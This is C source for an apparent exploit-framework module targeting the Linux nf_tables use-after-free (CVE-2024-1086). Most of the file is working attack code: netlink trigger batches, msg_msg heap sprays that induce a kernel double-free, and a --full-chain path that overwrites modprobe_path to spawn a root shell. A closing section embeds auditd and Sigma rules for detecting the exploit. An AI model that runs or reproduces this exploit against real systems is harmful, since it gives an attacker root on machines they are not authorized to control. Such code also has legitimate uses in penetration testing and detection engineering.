/* ------------------------------------------------------------------
 * The exploit body.
 * ------------------------------------------------------------------ */

static iamroot_result_t nf_tables_exploit(const struct iamroot_ctx *ctx)
{
    /* Gate 1: re-confirm vulnerability. detect() also checks user_ns. */
    iamroot_result_t pre = nf_tables_detect(ctx);
    if (pre != IAMROOT_VULNERABLE) {
        fprintf(stderr, "[-] nf_tables: detect() says not vulnerable; refusing\n");
        return pre;
    }

    /* Gate 2: already root? Nothing to escalate. */
    if (geteuid() == 0) {
        if (!ctx->json)
            fprintf(stderr, "[i] nf_tables: already running as root\n");
        return IAMROOT_OK;
    }

    if (!ctx->json) {
        if (ctx->full_chain) {
            fprintf(stderr, "[*] nf_tables: --full-chain — trigger + pipapo "
                            "arb-write + modprobe_path finisher\n");
        } else {
            fprintf(stderr, "[*] nf_tables: primitive-only run — fires the\n"
                            "    double-free state and stops. Pass --full-chain\n"
                            "    to attempt the modprobe_path root-pop.\n");
        }
    }

#ifdef __linux__
    /* --- --full-chain path --------------------------------------- *
     * Resolve offsets BEFORE doing anything destructive so we can
     * refuse cleanly on hosts where we have no modprobe_path. We run
     * in-process (no fork) because the finisher's modprobe_path
     * trigger needs the same task's userns+netns + nfnetlink socket
     * as the arb-write.
     */
    if (ctx->full_chain) {
        struct iamroot_kernel_offsets off;
        iamroot_offsets_resolve(&off);
        if (!iamroot_offsets_have_modprobe_path(&off)) {
            iamroot_finisher_print_offset_help("nf_tables");
            return IAMROOT_EXPLOIT_FAIL;
        }
        iamroot_offsets_print(&off);

        if (enter_unpriv_namespaces() < 0) {
            fprintf(stderr, "[-] nf_tables: userns entry failed\n");
            return IAMROOT_EXPLOIT_FAIL;
        }

        int sock = socket(AF_NETLINK, SOCK_RAW | SOCK_CLOEXEC, NETLINK_NETFILTER);
        if (sock < 0) {
            perror("[-] socket(NETLINK_NETFILTER)");
            return IAMROOT_EXPLOIT_FAIL;
        }
        struct sockaddr_nl src = { .nl_family = AF_NETLINK };
        if (bind(sock, (struct sockaddr *)&src, sizeof src) < 0) {
            perror("[-] bind"); close(sock); return IAMROOT_EXPLOIT_FAIL;
        }
        int rcvbuf = 1 << 20;
        setsockopt(sock, SOL_SOCKET, SO_RCVBUF, &rcvbuf, sizeof rcvbuf);

        /* Pre-spray to predictabilify the cg-96 slab. */
        int qids[SPRAY_MSGS * 4];
        for (size_t i = 0; i < sizeof qids / sizeof qids[0]; i++) qids[i] = -1;
        if (spray_msg_msg(qids, SPRAY_MSGS / 2) < 0) {
            close(sock); return IAMROOT_EXPLOIT_FAIL;
        }

        uint8_t *batch = calloc(1, 16 * 1024);
        if (!batch) { close(sock); return IAMROOT_EXPLOIT_FAIL; }

        /* Initial trigger batch (NEWTABLE/CHAIN/SET/SETELEM). */
        uint32_t seq = (uint32_t)time(NULL);
        size_t blen = build_trigger_batch(batch, 16 * 1024, &seq);
        if (!ctx->json) {
            fprintf(stderr, "[*] nf_tables: sending trigger batch (%zu bytes)\n",
                    blen);
        }
        if (nft_send_batch(sock, batch, blen) < 0) {
            fprintf(stderr, "[-] nf_tables: trigger batch failed\n");
            drain_spray(qids, SPRAY_MSGS / 2);
            free(batch); close(sock);
            return IAMROOT_EXPLOIT_FAIL;
        }

        /* Wire up the arb-write context and hand off to the shared
         * finisher. The finisher will:
         *   - call nft_arb_write(modprobe_path, "/tmp/iamroot-mp-...", N)
         *     which re-fires the trigger and sprays forged pipapo elems
         *   - execve() the trigger binary to invoke modprobe
         *   - poll for the setuid sentinel, and spawn a root shell. */
        struct nft_arb_ctx ac = {
            .in_userns = true,
            .sock      = sock,
            .batch     = batch,
            .qids      = qids,
            .qcap      = (int)(sizeof qids / sizeof qids[0]),
            .qused     = SPRAY_MSGS / 2,
        };

        iamroot_result_t r = iamroot_finisher_modprobe_path(&off,
                                 nft_arb_write, &ac, !ctx->no_shell);

        drain_spray(qids, ac.qused);
        free(batch);
        close(sock);
        return r;
    }
#endif

    /* --- primitive-only path: fork-isolated trigger -------------- *
     * Fork: child enters userns+netns and fires the bug. If the
     * kernel panics on KASAN we don't want our parent process to be
     * the one that takes the hit. */
    pid_t child = fork();
    if (child < 0) { perror("[-] fork"); return IAMROOT_TEST_ERROR; }

    if (child == 0) {
        /* --- CHILD --- */
        if (enter_unpriv_namespaces() < 0) _exit(20);

        if (!ctx->json) {
            fprintf(stderr, "[*] nf_tables: entered userns+netns; opening nfnetlink\n");
        }

        int sock = socket(AF_NETLINK, SOCK_RAW | SOCK_CLOEXEC, NETLINK_NETFILTER);
        if (sock < 0) { perror("[-] socket(NETLINK_NETFILTER)"); _exit(21); }

        struct sockaddr_nl src = { .nl_family = AF_NETLINK };
        if (bind(sock, (struct sockaddr *)&src, sizeof src) < 0) {
            perror("[-] bind"); close(sock); _exit(22);
        }
        /* Larger receive buffer so error replies don't drop. */
        int rcvbuf = 1 << 20;
        setsockopt(sock, SOL_SOCKET, SO_RCVBUF, &rcvbuf, sizeof rcvbuf);

        /* Phase 1: pre-spray msg_msg so the slab is predictable. */
        int qids[SPRAY_MSGS];
        for (int i = 0; i < SPRAY_MSGS; i++) qids[i] = -1;
        if (spray_msg_msg(qids, SPRAY_MSGS / 2) < 0) {
            fprintf(stderr, "[-] nf_tables: pre-spray failed\n");
            close(sock); _exit(23);
        }
        if (!ctx->json) {
            fprintf(stderr, "[*] nf_tables: pre-sprayed %d msg_msg slots\n",
                    SPRAY_MSGS / 2);
        }

        /* Phase 2: build the ruleset batch. */
        uint8_t *batch = calloc(1, 16 * 1024);
        if (!batch) { close(sock); _exit(24); }
        size_t off = 0;
        uint32_t seq = (uint32_t)time(NULL);

        put_batch_begin(batch, &off, seq++);
        put_new_table(batch, &off, seq++);
        put_new_chain(batch, &off, seq++);
        put_new_set(batch, &off, seq++);
        put_malicious_setelem(batch, &off, seq++);
        put_batch_end(batch, &off, seq++);

        if (!ctx->json) {
            fprintf(stderr, "[*] nf_tables: sending NEWTABLE/NEWCHAIN/NEWSET/"
                            "NEWSETELEM batch (%zu bytes)\n", off);
        }
        if (nft_send_batch(sock, batch, off) < 0) {
            fprintf(stderr, "[-] nf_tables: batch send failed\n");
            drain_spray(qids, SPRAY_MSGS);
            free(batch); close(sock); _exit(25);
        }

        /* Snapshot slabinfo before trigger. */
        long before = slabinfo_active("kmalloc-cg-96");
        if (before < 0) before = slabinfo_active("kmalloc-96");

        /* Phase 3: post-spray to claim the slot the about-to-be-freed
         * chain reference will vacate. (On a real exploit this is the
         * spray with a target object — sk_buff fragment list, msg_msg
         * payload of just-right size, etc. We spray msg_msg again as
         * a placeholder.) */
        if (spray_msg_msg(qids + SPRAY_MSGS / 2, SPRAY_MSGS / 2) < 0) {
            fprintf(stderr, "[-] nf_tables: post-spray failed\n");
        }

        /* Phase 4: fire the trigger. The malicious setelem we already
         * queued above caused nft_verdict_init() to grab a chain ref
         * on a NFT_GOTO whose chain doesn't actually exist. On commit
         * (or rollback, depending on kernel rev), the cleanup path
         * frees that chain ref twice. We can fire the commit either
         * by sending a second batch with DELRULE/DELSET, or by
         * closing the netlink socket while the transaction is
         * uncommitted.
         *
         * Easiest: re-send the *same* malicious setelem inside its
         * own batch. The second NEWSETELEM with NLM_F_CREATE on the
         * already-present element triggers EEXIST in the commit
         * phase, which on vulnerable kernels still runs the cleanup
         * that double-frees the chain ref. */
        size_t off2 = 0;
        seq++;
        put_batch_begin(batch, &off2, seq++);
        put_malicious_setelem(batch, &off2, seq++);
        put_batch_end(batch, &off2, seq++);
        if (!ctx->json) {
            fprintf(stderr, "[*] nf_tables: firing trigger (re-send malicious "
                            "setelem to provoke commit-time double-free)\n");
        }
        nft_send_batch(sock, batch, off2);

        /* Give the kernel time to run the commit cleanup. */
        usleep(50 * 1000);

        long after = slabinfo_active("kmalloc-cg-96");
        if (after < 0) after = slabinfo_active("kmalloc-96");
        if (!ctx->json) {
            fprintf(stderr, "[i] nf_tables: kmalloc-cg-96 active: %ld → %ld\n",
                    before, after);
        }

        drain_spray(qids, SPRAY_MSGS);
        free(batch);
        close(sock);

        /* Honest scope: we fired the bug but did not complete the
         * R/W primitive. Return a distinctive exit code so the
         * parent can report EXPLOIT_FAIL with the right message. */
        _exit(100);
    }

    /* --- PARENT --- */
    int status;
    waitpid(child, &status, 0);

    if (!WIFEXITED(status)) {
        /* Child died by signal — could be KASAN-triggered kernel
         * panic propagating as SIGBUS, or a clean SIGSEGV in our
         * groom. Either way: trigger fired in some form. */
        if (!ctx->json) {
            fprintf(stderr, "[!] nf_tables: child died by signal %d — bug likely "
                            "fired (KASAN/oops can manifest as child signal)\n",
                    WTERMSIG(status));
        }
        return IAMROOT_EXPLOIT_FAIL;
    }

    int rc = WEXITSTATUS(status);
    if (rc == 100) {
        if (!ctx->json) {
            fprintf(stderr, "[!] nf_tables: trigger fired; double-free state\n"
                            "    induced in nft chain refcount. Full kernel\n"
                            "    R/W chain NOT executed (Option B scope).\n"
                            "[i] nf_tables: to complete the exploit, port\n"
                            "    Notselwyn's pipapo leak + msg_msg+sk_buff\n"
                            "    cross-cache groom + modprobe_path overwrite\n"
                            "    from github.com/Notselwyn/CVE-2024-1086.\n");
        }
        return IAMROOT_EXPLOIT_FAIL;
    }

    if (rc >= 20 && rc <= 25) {
        if (!ctx->json) {
            fprintf(stderr, "[-] nf_tables: trigger setup failed (child rc=%d)\n", rc);
        }
        return IAMROOT_EXPLOIT_FAIL;
    }

    if (!ctx->json) {
        fprintf(stderr, "[-] nf_tables: unexpected child rc=%d\n", rc);
    }
    return IAMROOT_EXPLOIT_FAIL;
}

/* ----- Embedded detection rules ----- */

static const char nf_tables_auditd[] =
    "# nf_tables UAF (CVE-2024-1086) — auditd detection rules\n"
    "# Flag unshare(CLONE_NEWUSER|CLONE_NEWNET) followed by nft socket setup.\n"
    "# This is the canonical exploit shape; legitimate userns + nft use\n"
    "# (e.g. firewalld, docker rootless) will also trip — tune per env.\n"
    "-a always,exit -F arch=b64 -S unshare -k iamroot-nf-tables-userns\n"
    "-a always,exit -F arch=b32 -S unshare -k iamroot-nf-tables-userns\n"
    "# Also watch for the canonical post-exploit primitives: modprobe_path\n"
    "# overwrite OR setresuid(0,0,0) on a previously-non-root process.\n"
    "-a always,exit -F arch=b64 -S setresuid -F a0=0 -F a1=0 -F a2=0 -k iamroot-nf-tables-priv\n";

static const char nf_tables_sigma[] =
    "title: Possible CVE-2024-1086 nf_tables UAF exploitation\n"
    "id: a72b5e91-iamroot-nf-tables\n"
    "status: experimental\n"
    "description: |\n"
    "  Detects the canonical exploit shape: unprivileged user creating a\n"
    "  user namespace, then issuing nft commands within it. False positives:\n"
    "  legitimate use of nft inside containers, podman/docker rootless,\n"
    "  firewalld. Combine with process-tree analysis: a previously-unpriv\n"
    "  process that suddenly has effective uid 0 is the smoking gun.\n"
    "logsource: {product: linux, service: auditd}\n"
    "detection:\n"
    "  userns_clone:\n"
    "    type: 'SYSCALL'\n"
    "    syscall: 'unshare'\n"
    "    a0: 0x10000000\n"
    "  uid_change:\n"
    "    type: 'SYSCALL'\n"
    "    syscall: 'setresuid'\n"
    "    auid|expression: '!= 0'\n"
    "  condition: userns_clone and uid_change\n"
    "level: high\n"
    "tags: [attack.privilege_escalation, attack.t1068, cve.2024.1086]\n";

const struct iamroot_module nf_tables_module = {
    .name           = "nf_tables",
    .cve            = "CVE-2024-1086",
    .summary        = "nf_tables nft_verdict_init UAF (cross-cache) → arbitrary kernel R/W",
    .family         = "nf_tables",
    .kernel_range   = "5.14 ≤ K, fixed mainline 6.8; backports: 6.7.2 / 6.6.13 / 6.1.74 / 5.15.149 / 5.10.210 / 5.4.269",
    .detect         = nf_tables_detect,
    .exploit        = nf_tables_exploit,
    .mitigate       = NULL,    /* mitigation: upgrade kernel; OR set unprivileged_userns_clone=0 */
    .cleanup        = NULL,
    .detect_auditd  = nf_tables_auditd,
    .detect_sigma   = nf_tables_sigma,
    .detect_yara    = NULL,
    .detect_falco   = NULL,
};

void iamroot_register_nf_tables(void)
{
    iamroot_register(&nf_tables_module);
}
